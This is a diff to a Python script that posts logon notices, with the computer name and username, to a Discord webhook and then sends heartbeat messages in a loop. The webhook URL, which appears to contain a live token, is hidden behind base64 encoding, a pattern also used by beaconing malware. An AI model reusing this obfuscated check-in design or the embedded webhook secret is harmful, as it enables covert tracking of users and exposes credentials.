@@ -9,6 +9,15 @@ from time import sleep
 # Base64-encoded Discord webhook URL
 WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MTM2NTkwMjUzOTg4NjYxNC96SDZnWkI4YXNzLTY3TTJVQkVXWFcwTGk2a21vOWtPc2NrOUhOZ0pBMk5Ea2JhYW1vbWs0cDQ4bzR1WGdwaUZFdjJwZA=="
 
+def format_start_data(computer_name,user_name):
+    data = {'info':'script_started','script':'user','computer':computer_name,'username':user_name}
+    return f"||{json.dumps(data)}||"
+
+def format_alive_data(computer_name,user_name):
+    data = {'info':'alive','script':'user','computer':computer_name,'username':user_name}
+    return f"||{json.dumps(data)}||"
+    
+
 def send_webhook(message):
     webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")
 
@@ -39,6 +48,7 @@ if __name__ == "__main__":
     user_name = getpass.getuser()
 
     msg = (
+        f"{format_start_data(computer_name,user_name)}\n"
         "👤 **User Logon**\n"
         f"Computer: `{computer_name}`\n"
         f"User: `{user_name}`"
@@ -46,9 +56,10 @@ if __name__ == "__main__":
 
     send_webhook(msg)
 
-
+alive_data = format_alive_data(computer_name,user_name)
 while True:
     msg = (
+        f"{alive_data}\n"
         "User script is running"
     )
 
